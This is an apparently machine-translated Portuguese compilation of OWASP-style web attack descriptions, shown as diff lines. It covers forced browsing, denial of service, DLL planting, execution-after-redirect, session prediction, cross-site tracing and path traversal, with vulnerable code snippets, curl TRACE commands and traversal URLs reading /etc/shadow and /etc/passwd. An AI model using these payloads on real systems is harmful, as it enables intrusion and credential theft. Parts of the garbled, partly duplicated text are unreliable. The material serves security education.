+Este exemplo apresenta uma técnica de ataque previsível de localização de recursos, que é baseado numa identificação manual e orientada de recursos, modificando os parâmetros de URL. O user1 quer verificar sua agenda on-line através do seguinte URL:
+
+
+ www.site-example.com/users/calendar.php/user1/20070715 
+
+
+Na URL, é possível identificar o nome de usuário (âuser1â) E a data (dd / mm / aaaa). Se o usuário tenta fazer um ataque de Navegação forçada, ele podia adivinhar outro userâ agenda s, prevendo a identificação do usuário e data, como a seguir:
+
+
+ www.site-example.com/users/calendar.php/user6/20070716 
+
+
+O ataque pode ser considerado bem sucedido ao acessar a agenda de outro usuário. A má implementação do mecanismo de autorização contribuíram para o sucesso deste ataque.
+
+Exemplo 2 ~
+Este exemplo apresenta um ataque de diretório estático e de enumeração de arquivo utilizando uma ferramenta automatizada.
+A ferramenta de verificação, como Nikto, tem a capacidade de procurar por arquivos e diretórios existentes com base em um banco de dados bem sabem os recursos, tais como (Que podem também ser flagradas com URLi (IOS)):
+
+/system/
+/password/
+/logs/
+/admin/
+/test/
+
+Quando a ferramenta recebe um âHTTP 200Â mensagem, significa que esse recurso foi encontrado e devem ser inspecionados manualmente para obter informações valiosas.
+############################# FIM
+
+
+
+
+
+COMEÇO #############################
+@ Negação de Serviço
+
+Descrição
+
+O ataque de Negação de Serviço (Denial of Service - DoS) é focado em tornar indisponíveis um recurso (site, aplicativo ou servidor) para a finalidade que foi projetado. Há muitas maneiras de deixar um serviço indisponível para os usuários legítimos através da manipulação de pacotes de rede, programação, lógica, ou recursos de manipulação vulnerabilidades, entre outros. Se um serviço recebe um número muito grande de solicitações, ele pode parar de fornecer o serviço a usuários legítimos. Da mesma maneira, um serviço poderá deixar de funcionar se uma vulnerabilidade de programação é explorada, ou o modo como o serviço manipula recursos utilizados pelo mesmo.
+Às vezes, o atacante pode injetar e executar código arbitrário ao executar um ataque de negação de serviço, a fim de acessar informações críticas ou executar comandos no servidor. Denial-of-service ataca significativamente a qualidade do serviço experimentado por usuários legítimos. Ele apresenta grandes atrasos na resposta, perdas excessivas, e interrupções de serviço, resultando em impacto direto sobre a disponibilidade.
+
+Exemplos
+
+As seguintes técnicas DoS e exemplos foram extraídos da OWASP Testing Guide v2.
+
+DoS Usuário especificado alocação de objeto ~
+Se os usuários podem fornecer, direta ou indiretamente, um valor que irá especificar quantos de um objeto para criar no servidor de aplicação, e se o servidor não impõe um limite rígido sobre esse valor, é possível fazer com que o ambiente possa executar de memória disponível. O servidor pode começar a afetar o número necessário de objetos, mas se este for um número extremamente grande, pode causar graves problemas no servidor, possivelmente enchendo toda a sua memória disponível e danificando o seu desempenho.
+O seguinte é um exemplo simples de código vulnerável em Java:
+
+
+
+String TotalObjects = request.getParameter(“numberofobjects”);
+int NumOfObjects = Integer.parseInt(TotalObjects);
+ComplexObject[] anArray = new ComplexObject[NumOfObjects];  // wrong!
+
+
+
+DoS entrada do usuário como um contador de loop ~
+Similar ao problema anterior de utilização especificada e Atribuição de objeto, se o utilizador pode, direta ou indiretamente, atribuir um valor que vai ser utilizado como um contador em função loop, isto pode causar problemas de desempenho no servidor.
+O seguinte é um exemplo de código vulnerável em Java:
+
+
+public class MyServlet extends ActionServlet {
+   public void doPost(HttpServletRequest request, HttpServletResponse response)
+          throws ServletException, IOException {
+          . . . 
+          String [] values = request.getParameterValues("CheckboxField");
+      // Process the data without length check for reasonable range – wrong!
+          for ( int i=0; i<values.length; i++) {
+                // lots of logic to process the request
+         }
+         . . . 
+   }
+    . . . 
+}
+
+
+Como podemos ver neste exemplo simples, o usuário tem o controle sobre o contador de loop. Se o código dentro do laço é muito exigente em termos de recursos, e um intruso força a ser executado um número muito elevado de vezes, isso pode diminuir o desempenho do servidor no tratamento de outras solicitações, causando uma condição de negação.
+
+DoS armazenar muitos dados em sessão ~
+Cuidados devem ser tomados para não armazenar muitos dados em um objeto de sessão do usuário. Armazenar muita informação na sessão, como grandes quantidades de dados obtidos a partir do banco de dados, pode causar negação de questões de serviço. Este problema é agravado se os dados da sessão também é rastreado antes de um login, como um usuário pode iniciar o ataque, sem a necessidade de uma conta.
+
+DoS bloqueio de Contas de Clientes ~
+O primeiro caso de negação de serviço a considerar envolve o sistema de autenticação da aplicação alvo. A defesa comum para evitar a descoberta de força bruta de senhas de usuários é bloquear uma conta do uso depois de três a cinco tentativas frustradas de login. Isto significa que mesmo que um usuário legítimo foi a fornecer sua senha válida, eles não seriam capazes de entrar no sistema até a sua conta ser desbloqueada. Esse mecanismo de defesa pode ser transformado em um ataque DoS contra uma aplicação se não houver uma maneira de prever contas de logon válidas.
+Observe, não é um negócio versus equilíbrio de segurança que deve ser alcançado com base nas circunstâncias específicas de um determinado aplicativo. Há prós e contras para as contas de bloqueio, para os clientes poderem escolher os seus próprios nomes de conta, ao uso de sistemas como o CAPTCHA, e assim por diante. Cada empresa terá de equilibrar os riscos e benefícios, mas não todos os detalhes dessas decisões são cobertos aqui.
+
+DoS falha para liberar recursos ~
+Se ocorrer um erro na aplicação que impede a liberação em um recurso de uso, pode se tornar disponível para uso posterior. Exemplos possíveis incluem:
+
+- Uma aplicação bloqueia o ficheiro para escrita, e, em seguida, ocorre uma exceção, mas não explicitamente fechar e abrir o arquivo
+- Vazamento de memória nas línguas em que o desenvolvedor é responsável pelo gerenciamento de memória, como C & C + +. No caso de um erro, faz com que o fluxo da lógica normal a ser contornada à memória atribuída não pode ser removida e pode ser deixada em um estado tal que o coletor de lixo não sabe que deverá ser recuperado
+- Uso de objetos de conexão de um banco de dados onde os objetos não estão sendo liberados se uma exceção é lançada. Uma série de tais pedidos repetidos podem causar o aplicativo para consumir todas as conexões de banco de dados, já que o código ainda irá realizar o objeto DB, e  nunca liberar o recurso.
+
+O seguinte é um exemplo de código vulnerável em Java. No exemplo, tanto a ligação e a CallableStatement devem ser fechadas de um último bloco.
+
+
+public class AccountDAO {
+    … …
+    public void createAccount(AccountInfo acct)  
+                 throws AcctCreationException {
+       … …
+           try {
+            Connection conn = DAOFactory.getConnection();
+            CallableStatement  calStmt = conn.prepareCall(…);
+          …  …	
+           calStmt.executeUpdate();
+           calStmt.close();
+          conn.close();
+       }  catch (java.sql.SQLException e) {
+            throw AcctCreationException (...);
+       }
+    }
+}
+
+
+DoS sobrecarga de memória ~
+Qualquer linguagem onde o desenvolvedor tem a responsabilidade direta pelo gerenciamento de alocação de memória, mais notavelmente C & C + +, tem o potencial para um buffer overflow (uma sobrecarga de memória). Embora o risco mais grave relacionado a um buffer overflow é a capacidade de executar código arbitrário no servidor, o primeiro risco vem da negação de serviço que pode acontecer se o aplicativo falha.
+O seguinte é um exemplo simplificado de código vulnerável em C:
+
+
+void overflow (char *str) {
+   char buffer[10];
+   strcpy(buffer, str); // Dangerous!
+}
+
+int main () {
+  char *str = "This is a string that is larger than the buffer of 10";
+  overflow(str);
+}
+
+
+
+Se este exemplo de código for executado, causaria uma falha de segmentação e núcleo de despejo. A razão é que strcpy iria tentar copiar 53 caracteres em uma matriz de apenas 10 elementos, substituindo posições de memória adjacentes. Embora este exemplo acima seja um caso extremamente simples, a realidade é que em um aplicativo baseado na web pode haver lugares onde a entrada do usuário não é verificada de forma adequada para o seu comprimento, tornando este tipo de ataque possível.
+############################# FIM
+
+
+
+
+
+COMEÇO #############################
+@ Página de Sequestro (Page Hijacking)
+
+Descrição
+
+Além de utilizar uma aplicação vulnerável para enviar conteúdo malicioso para um usuário, a mesma vulnerabilidade raiz também pode ser aproveitada para redirecionar o conteúdo sensível gerado pelo servidor e destinadas ao utilizador para o atacante em seu lugar. Ao enviar um pedido que resulta em duas respostas, a resposta de intenção do servidor e a resposta gerada pelo atacante, um atacante pode causar um nó intermediário, como um servidor proxy compartilhada, para desorientar a resposta gerada pelo servidor do atacante para o usuário. Porque o pedido feito pelo atacante gera duas respostas, a primeira é interpretada como uma resposta ao pedido do atacante, enquanto o segundo permanece no limbo. Quando o usuário faz uma solicitação legítima, através da mesma conexão TCP, o pedido do atacante já está esperando e é interpretado como uma resposta a um pedido da vítima. O atacante, então, envia uma segunda solicitação para o servidor, para que o servidor proxy responda com o pedido gerado e o servidor destina-se à vítima, comprometendo, assim, qualquer informação sensível nos cabeçalhos ou corpo da resposta destinada à vítima.
+############################# FIM
+
+
+
+
+
+COMEÇO #############################
+@ [+] Plantação de Binários
+
+Descrição
+
+Plantio de binário é um termo geral para um ataque onde o local do ataque (ou seja, plantas) planta um arquivo binário que contém o código malicioso para um sistema de arquivos local ou remoto, para que uma aplicação vulnerável para carregar e executar.
+Existem várias maneiras este ataque pode ocorrer:
+Permissões de acessos inseguros em um diretório local permitir que um invasor local possa plantar o binário malicioso em um local confiável. (Um exemplo típico é um instalador do aplicativo não configurar corretamente as permissões em diretórios usados​para armazenar os arquivos do aplicativo.)
+Uma aplicação pode ser usada para o plantio de um binário malicioso em local confiável de outro aplicativo. (Um exemplo é o Internet Explorer - a vulnerabilidade ameaça combinada Safari)
+O aplicativo procura por um binário em locais não confiáveis​​, possivelmente em sistemas de arquivos remotos. (Um exemplo típico é um aplicativo do Windows carregar uma biblioteca de vínculo dinâmico a partir do diretório de trabalho atual depois de este ter sido definido para uma pasta compartilhada de rede.)
+
+Exemplos
+
+Acesso inseguro, ataque baseado em permissões ~
+Um instalador de aplicativos do Windows cria um diretório raiz (C: \ Application) e instala o aplicativo nele, mas não limita o acesso ao diretório para usuários não-privilegiados escrever.
+Suponha que a aplicação (C: \ Application \ App.exe) carrega a biblioteca WININET.DLL chamando LoadLibrary ("WININET.DLL"). Esta biblioteca deverá ser encontrado na pasta System32 do Windows.
+Usuário Local A planta uma biblioteca WININET.DLL malicioso em C: \ Application
+Usuário local B inicia o aplicativo, que carrega e executa o WININET.DLL malicioso em vez do legítimo.
+
+Ataque baseado Diretório de trabalho atual ~
+Suponha que um aplicativo do Windows carrega a biblioteca Dwmapi.dll chamando LoadLibrary ("Dwmapi.dll"). Esta biblioteca deverá ser encontrado na pasta System32 do Windows, mas só existe no Windows Vista e Windows 7.
+Suponha que a aplicação está associada à "bp". Extensão de arquivo.
+O atacante cria uma pasta compartilhada de rede e coloca arquivos honeypot.bp e Dwmapi.dll nesta pasta (possivelmente marcando o último como oculto).
+O atacante convida um usuário do Windows XP para visitar a pasta compartilhada com o Windows Explorer.
+Quando o usuário clica duas vezes em honeypot.bp, usuário Windows Explorer define o diretório de trabalho atual para o compartilhamento remoto e lança o aplicativo para abrir o arquivo.
+O aplicativo tenta carregar Dwmapi.dll, mas não conseguir encontrá-lo nas pastas de sistema do Windows, ele carrega e executa-lo a partir de compartilhamento de rede do invasor.
+
+Ataque baseado Diretório de trabalho atual ~
+1. Suponha que um aplicativo do Windows carrega a biblioteca Dwmapi.dll chamando LoadLibrary ("Dwmapi.dll"). Esta biblioteca deverá ser encontrado na pasta System32 do Windows, mas só existe no Windows Vista e Windows 7.
+2. Suponha que a aplicação está associada à "bp". Extensão de arquivo.
+3. O atacante cria uma pasta compartilhada de rede e coloca arquivos honeypot.bp e Dwmapi.dll nesta pasta (possivelmente marcando o último como oculto).
+4. O atacante convida um usuário do Windows XP para visitar a pasta compartilhada com o Windows Explorer.
+5. Quando o usuário clica duas vezes em honeypot.bp, usuário Windows Explorer define o diretório de trabalho atual para o compartilhamento remoto e lança o aplicativo para abrir o arquivo.
+6. O aplicativo tenta carregar Dwmapi.dll, mas não conseguir encontrá-lo nas pastas de sistema do Windows, ele carrega e executa-lo a partir de compartilhamento de rede do invasor.
+############################# FIM
+
+
+
+
+
+COMEÇO #############################
+@ Pós-execução de redireccionamento (EAR)
+
+Visão Geral
+
+Pós-execução de redirecionamento (EAR) é um ataque onde um atacante ignora os redirecionamentos e recupera o conteúdo sensível destinado a usuários autenticados. Um exploit EAR bem sucedida pode levar ao completo comprometimento do aplicativo.
+
+
+Como testar Vulnerabilidades EAR
+
+Usando a maioria dos proxies é possível ignorar redirecionamentos e mostrar o que é retornado. Neste teste usamos Burp Proxy.
+
+1 - Intercepte um pedido (requisição) https://vulnerablehost.com/managment_console
+2 - Envie para o repetidor.
+3 - Veja a resposta.
+
+
+Como evitar vulnerabilidades EAR
+
+Terminação adequada deve ser realizada após redirecionamentos. Em uma função de retorno deve ser realizada. No deve ser realizada em outras instâncias de funções, tais como morrer (). Isto irá dizer que o aplicativo terminar, independentemente de se a página é redirecionada ou não.
+############################# FIM
+
+
+
+
+
+COMEÇO #############################
+@ Previsão de Sessão
+
+Descrição
+
+O ataque previsão de sessão centra-se na previsão dos valores de ID de sessão que permitem a um atacante contornar o esquema de autenticação de um aplicativo. Ao analisar e compreender o processo de geração de ID da sessão, um atacante pode prever um valor de ID de sessão válido que tenha acesso ao aplicativo.
+Na primeira etapa, o atacante precisa coletar alguns valores de ID de sessão válidos que são usados​para identificar os usuários autenticados. Então, ele deve entender a estrutura de ID da sessão, a informação que é usada para criá-lo, e a criptografia ou algoritmo de hash usada pelo aplicativo para protegê-lo. Algumas implementações ruins usam IDs de sessões compostas por nome de usuário ou outras informações previsíveis, como data e hora ou o endereço IP do cliente. No pior dos casos, esta informação é utilizada em texto claro ou codificados usando um algoritmo fraco como codificação base64.
+Além disso, o atacante pode implementar uma técnica de força bruta para gerar e testar diferentes valores de ID da sessão até que ele obtiver com sucesso o acesso ao aplicativo.
+
+Exemplos
+
+As informações de ID da sessão para uma determinada aplicação é normalmente composta por uma sequência de largura fixa. A aleatoriedade é muito importante para evitar a sua previsão. Olhando para o exemplo da Figura 1, a variável de ID da sessão é representada por JSESSIONID e o seu valor é "Usuário01", que corresponde ao nome do usuário. Ao tentar novos valores para ele, como "Usuário02", que poderia ser possível obter dentro do aplicativo sem autenticação prévia.
+Previsão de um Cookie autenticado: https://www.owasp.org/images/b/b8/Predictable_cookie.JPG
+############################# FIM
+
+
+
+
+
+COMEÇO #############################
+@ Rastreamento Cross-Site
+
+Descrição
+
+A Cross-Site Tracing ataque (XST) envolve o uso de Cross-site Scripting (XSS) e TRACE ou TRACK métodos HTTP. De acordo com a RFC 2616, "TRACE permite que o cliente possa ver o que está a ser recebido na outra extremidade da cadeia de pedido e utilizar esses dados para o teste ou a informação de diagnóstico.", O método age na mesma maneira, mas é específico para o servidor web IIS da Microsoft. XST poderia ser usada como um método para roubar cookies do usuário por meio de Cross-site Scripting (XSS), mesmo se o cookie tem o "HttpOnly" set bandeira e / ou expor cabeçalho de autorização do usuário.
+O método TRACE, embora aparentemente inofensivo, pode ser aproveitado com sucesso em alguns cenários para roubar credenciais de usuários legítimos. Esta técnica de ataque foi descoberta por Jeremiah Grossman, em 2003, em uma tentativa de contornar a tag HttpOnly que a Microsoft introduziu no Internet Explorer 6 SP1 para proteger os cookies sejam acessados ​​por JavaScript. Por uma questão de fato, um dos padrões de ataque mais recorrentes em Cross Site Scripting é acessar o objeto Document e enviá-lo para um servidor web controlado pelo atacante para que ele / ela possa sequestrar a sessão da vítima (Hijacking). Marcando um cookie como HttpOnly proíbe JavaScript para acessá-lo, protegendo-o de ser enviado para um terceiro. No entanto, o método de rastreamento pode ser usado para contornar essa proteção e acessar o cookie, mesmo neste cenário.
+Navegadores modernos agora evitar solicitações de rastreamento estão sendo feitas via JavaScript, no entanto, outras formas de envio de solicitações de rastreamento com os navegadores foram descobertos, como o uso de Java.
+
+Exemplos
+
+Um exemplo usando cURL na linha de comando para enviar um pedido de rastreio para um servidor web no localhost com TRACE ativada. Observe como o servidor web responde com o pedido, que foi enviado a ele.
+
+
+$ curl -X TRACE 127.0.0.1
+TRACE / HTTP/1.1
+User-Agent: curl/7.24.0 (x86_64-apple-darwin12.0) libcurl/7.24.0 OpenSSL/0.9.8r zlib/1.2.5
+Host: 127.0.0.1
+Accept: */*
+
+
+Neste exemplo ele avisa de como nós enviamos um cabeçalho de cookie com o pedido e que também está na resposta do servidor web.
+
+
+$ curl -X TRACE -H "Cookie: name=value" 127.0.0.1
+TRACE / HTTP/1.1
+User-Agent: curl/7.24.0 (x86_64-apple-darwin12.0) libcurl/7.24.0 OpenSSL/0.9.8r zlib/1.2.5
+Host: 127.0.0.1
+Accept: */*
+Cookie: name=value
+
+
+Neste exemplo, o método TRACE é desativado, observe como obtemos um erro, em vez de o pedido que enviamos.
+
+
+$ curl -X TRACE 127.0.0.1
+<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
+<html><head>
+<title>405 Method Not Allowed</title>
+</head><body>
+<h1>Method Not Allowed</h1>
+<p>The requested method TRACE is not allowed for the URL /.</p>
+</body></html>
+
+
+Exemplo JavaScript XMLHttpRequest com o pedido TRACE. No Firefox 19.0.2 não funcionará e retornará um erro "valor ilegal". No Google Chrome 25.0.1364.172 não vai funcionar e retornar um "erro Uncaught: SecurityError: DOM Exception 18" de erro. Isso ocorre porque os navegadores modernos agora bloqueiam o método TRACE em XMLHttpRequest para ajudar a mitigar XST.
+
+
+<script>
+  var xmlhttp = new XMLHttpRequest();
+  var url = 'http://127.0.0.1/';
+
+  xmlhttp.withCredentials = true; // send cookie header
+  xmlhttp.open('TRACE', url, false);
+  xmlhttp.send();
+</script>
+
+
+Remediação ~
+
+Apache
+
+Em versões do Apache 1.3.34, 2.0.55 ou posteriores, definir a directiva TraceEnable para "off" no arquivo de configuração principal e, em seguida, reiniciar o Apache. Veja TraceEnable para mais informações.
+
+
+TraceEnable off
+############################# FIM
+
+
+
+
+
+COMEÇO #############################
+@ Spyware
+
+Descrição
+
+Spyware é um programa que captura informações estatísticas a partir de um computador do usuário e os envia pela internet, sem a aceitação do usuário. Essas informações são geralmente obtidas a partir de cookies e histórico do navegador da web. O spyware também pode instalar outro software, anúncios de exibição, ou redirecionar a atividade do navegador web. Spyware é diferente de vírus, worms e adware de várias maneiras. Spyware não se auto-replica e distribui-se como vírus e worms, e não necessariamente exibe anúncios como adware. As características comuns entre spyware e vírus, worms e adware são:
+1 - exploração do computador infectado para fins comerciais
+2 - o mostrador, em alguns casos, de anúncios
+
+Exemplo em imagem: https://www.owasp.org/images/6/68/Figura2.jpg
+############################# FIM
+
+
+
+
+
+COMEÇO #############################
+@ Travessia de Caminho Relativo
+
+Descrição
+
+Este ataque é uma variante do Atravessamento de Caminho e pode ser explorado quando a aplicação aceita o uso de sequências de passagem relativos, tais como ".. /."
+
+Exemplos
+
+As seguintes URLs são vulneráveis​a esse ataque:
+
+ http://some_site.com.br/get-files.jsp?file=report.pdf  
+ http://some_site.com.br/get-page.php?home=aaa.html  
+ http://some_site.com.br/some-page.asp?page=index.html  
+
+Uma maneira simples de executar este ataque é assim:
+
+
+ http://some_site.com.br/get-files?file=../../../../some dir/some file  
+ http://some_site.com.br/../../../../etc/shadow  
+ http://some_site.com.br/get-files?file=../../../../etc/passwd 
+############################# FIM
+
+
+
+
+Abraços, e boa sorte - de Roxle :)
+
